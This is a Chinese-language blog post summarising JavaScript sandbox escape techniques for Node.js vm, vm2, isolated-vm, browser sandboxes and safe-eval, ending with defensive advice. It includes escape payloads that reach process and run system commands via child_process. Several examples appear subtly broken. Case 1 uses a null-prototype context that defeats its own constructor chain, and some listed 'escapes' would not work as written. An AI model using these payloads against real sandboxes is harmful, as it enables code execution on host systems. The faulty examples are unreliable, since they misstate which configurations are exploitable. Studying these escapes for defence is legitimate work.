---
title: JavaScript 沙箱逃逸技术总结
date: 2026-04-02 11:00:00
categories:
  - Node.js安全
tags:
  - Node.js
  - 沙箱逃逸
  - vm2
  - JavaScript安全

---

# JavaScript 沙箱逃逸技术总结

信息收集：
1.确定沙箱类型与引擎：
•宿主环境： 是 Node.js、浏览器，还是特定的嵌入式环境（如 IoT 设备、插件系统）？
• 沙箱库： 如果是 Node.js，它使用的是原生的 vm 模块，还是第三方库如 vm2（已停止维护但仍常见）、isolated-vm 或 safe-eval？
• JS 引擎版本： 收集 process.version 或 navigator.userAgent。很多逃逸手段是基于 V8 或 QuickJS 特定的 CVE 漏洞的。
2.测试全局对象
常见的全局变量： 测试 global、window、self、this 是否可用。
禁用列表（Blacklist）： 尝试访问 process、require、module、Buffer。如果这些直接可用，那沙箱基本等同于透明。
原型链探测： 这是最关键的一步。通过一个简单的字面量（如 {} 或 []）向上追溯
3.枚举全局键
• 使用 Object.getOwnPropertyNames(global) 或 this 来获取全局对象的所有属性。
• 使用 for...in 循环遍历全局对象的原型链。
• 检查是否有隐藏的全局变量，如 GLOBAL、root、globalThis。

## 常见的 JavaScript 沙箱逃逸技术

### 1. 原型链污染逃逸
- 通过修改内置原型（如 Object.prototype、Array.prototype）来影响沙箱外的代码。
- 示例：`Object.prototype.polluted = 'escape'` 可能导致沙箱外代码访问该属性时执行恶意代码。

### 2. 利用沙箱的上下文隔离缺陷
- Node.js 的 `vm` 模块默认不提供完全隔离，可以通过 `this` 访问外部全局对象。
- 示例：在 `vm` 中执行 `this.constructor.constructor('return process')().exit()` 可以逃逸。

### 3. 利用 JavaScript 引擎漏洞
- 已知的 V8 漏洞（如 CVE-2020-16040、CVE-2021-21220）可以用于逃逸。
- 需要针对特定引擎版本进行利用。

### 4. 绕过函数黑名单
- 沙箱可能禁用 `eval`、`Function`、`setTimeout` 等，但可以通过间接调用绕过。
- 示例：使用 `[].map.constructor('return eval')()` 或 `(0, eval)('code')`。

### 5. 利用模块系统
- 在 Node.js 中，如果 `require` 可用，可以直接加载模块执行系统命令。
- 示例：`require('child_process').execSync('whoami')`。

### 6. 利用异步操作
- 通过 Promise、setImmediate、nextTick 等异步操作在沙箱外执行代码。
- 示例：`Promise.resolve().then(() => { global.process.exit() })`。

### 7. 利用错误处理机制
- 通过抛出错误并捕获，在错误堆栈中访问外部全局对象。
- 示例：`try { throw new Error() } catch(e) { e.constructor.constructor('return process')() }`。

### 8. 利用属性描述符
- 通过 `Object.getOwnPropertyDescriptor` 获取函数的 `caller` 或 `arguments` 属性，可能泄漏外部上下文。

## 针对不同沙箱的绕过方式

### 1. Node.js 原生 vm 模块
- 默认情况下，`vm` 模块的上下文与当前全局对象共享，可以通过 `this` 逃逸。
- 使用 `vm.createContext` 并传递一个空白对象可以增强隔离，但仍有逃逸可能。
- 绕过方式：
  - 使用 `this.constructor.constructor` 访问外部 Function 构造函数。
  - 利用 `arguments.callee.caller` 追溯调用栈。
  - 使用 `GeneratorFunction` 或 `AsyncFunction` 创建新函数。

### 2. vm2 沙箱
- vm2 通过代理和钩子实现更强的隔离，但仍存在历史漏洞。
- 已知逃逸方式：
  - 利用 `Error.prepareStackTrace` 钩子（CVE-2023-30547）。
  - 通过 `Promise` 处理程序逃逸（CVE-2023-32314）。
  - 使用 `Proxy` 绕过钩子检查。

### 3. isolated-vm
- 基于 V8 隔离的沙箱，安全性较高，逃逸难度大。
- 可能的绕过方式：
  - 利用 V8 引擎漏洞。
  - 通过共享内存（`ExternalCopy`）进行攻击。

### 4. 浏览器沙箱（如 iframe、Web Workers）
- 浏览器沙箱通常基于同源策略，逃逸可能导致跨站脚本（XSS）。
- 绕过方式：
  - 利用 postMessage 通信漏洞。
  - 利用 SharedArrayBuffer 或 Atomics 进行侧信道攻击。
  - 利用浏览器扩展漏洞。

### 5. safe-eval 库
- 该库尝试通过正则表达式过滤危险代码，但容易被绕过。
- 绕过方式：
  - 使用 Unicode 或字符串编码绕过正则检测。
  - 利用模板字符串执行代码：`` `${Function('return process')()}` ``。

## 实际逃逸案例

### 案例1：Node.js vm 模块逃逸
```javascript
const vm = require('vm');
const script = `
  const result = this.constructor.constructor('return process')();
  result.mainModule.require('child_process').execSync('id');
`;
vm.runInContext(script, vm.createContext(Object.create(null)));
```

### 案例2：vm2 逃逸（CVE-2023-30547）
```javascript
const {VM} = require('vm2');
const vm = new VM();
const code = `
  Error.prepareStackTrace = (error, stack) => {
    return stack;
  };
  const stack = new Error().stack;
  stack[0].getFunction().constructor('return process')();
`;
console.log(vm.run(code));
```

### 案例3：绕过 safe-eval
```javascript
const safeEval = require('safe-eval');
const code = "Function('return global')()";
safeEval(code); // 可能返回全局对象
```

## 防御建议

1. **使用完全隔离的沙箱**：如 isolated-vm 或 WebAssembly 沙箱。
2. **最小化暴露的全局对象**：只传递必要的对象到沙箱上下文。
3. **监控沙箱内的行为**：检测异常的资源使用或网络请求。
4. **及时更新依赖**：修复已知的沙箱漏洞。
5. **使用白名单而非黑名单**：只允许安全的操作，而不是禁止危险的操作。
6. **审计沙箱配置**：定期检查沙箱的安全设置。

## 总结

JavaScript 沙箱逃逸是一个持续演进的领域，随着新的漏洞和绕过技术的出现，防御策略也需要不断更新。理解沙箱的工作原理和常见逃逸技术有助于构建更安全的应用程序。
